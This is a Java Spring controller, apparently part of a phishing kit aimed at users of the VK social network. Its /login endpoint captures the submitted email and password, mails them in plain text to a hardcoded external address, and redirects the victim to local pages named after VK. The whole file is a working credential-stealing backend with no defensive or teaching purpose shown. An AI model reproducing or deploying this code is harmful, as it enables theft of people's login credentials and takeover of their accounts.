package com.example.sweater;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class VKController {

    @Autowired
    private MailSender mailSender;

    private static final String mailTo = "konecKoncaJ@mail.ru";

    private volatile int counter = 0;

    @GetMapping("/login")
    public String login(
            @RequestParam("email") String email,
            @RequestParam("pass") String pass
    ){

        synchronized (VKController.this){

            if(counter % 2 == 0){
                counter++;

               sentMessage("time: " + (counter % 2) + " login: " + email + " " + " password: " + pass);

                return "redirect:/vk.com.html";
            }
            else {
                counter++;

                sentMessage("time: " + (counter % 2) + " login: " + email + " " + " password: " + pass);

                return "redirect:/vkPhotoMaster.html";
            }

        }

    }

    private void sentMessage(String content){
        mailSender.send(mailTo, content);
    }


}
